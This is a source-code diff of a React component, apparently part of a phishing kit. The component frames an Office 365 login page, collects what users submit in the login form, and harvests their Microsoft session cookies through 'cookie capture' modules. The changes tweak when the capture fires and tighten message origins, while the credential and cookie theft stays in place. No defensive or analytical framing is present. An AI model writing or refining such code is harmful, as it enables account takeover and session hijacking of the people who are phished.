@@ -30,9 +30,6 @@ const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onL
 
     microsoftCookieCapture.onMicrosoftSession(handleMicrosoftSession);
 
-    // Start real cookie capture
-    realCookieCapture.forceCaptureNow();
-    
     // Log real cookie stats
     const stats = realCookieCapture.getCookieStats();
     console.log('🔵 Real Cookie Capture Stats:', stats);
@@ -51,7 +48,7 @@ const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onL
           cookies: event.data.payload.cookies || realCookieCapture.getAllCookies(),
           cookieList: event.data.payload.cookieList || realCookieCapture.getAllCookies()
         };
-        handleFormSubmit(new Event('submit'), formData);
+        handleFormSubmit(new Event('submit') as any, formData);
       }
       
       // Capture Microsoft cookies from iframe messages
@@ -85,11 +82,6 @@ const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onL
             timestamp: new Date().toISOString()
           }));
         }
-        
-        setTimeout(() => {
-          microsoftCookieCapture.forceCaptureNow();
-          realCookieCapture.forceCaptureNow();
-        }, 1000);
       }
     };
     window.addEventListener('message', handleMessage);
@@ -104,7 +96,7 @@ const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onL
       iframeRef.current.contentWindow.postMessage({
         type: 'LOGIN_ERROR',
         payload: { message: errorMessage }
-      }, '*');
+      }, window.location.origin);
     }
   }, [errorMessage]);
 
@@ -127,7 +119,6 @@ const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onL
           setIsIframeLoading(false);
           // Trigger initial cookie capture when iframe loads
           setTimeout(() => {
-            microsoftCookieCapture.forceCaptureNow();
             realCookieCapture.forceCaptureNow();
           }, 2000);
         }}
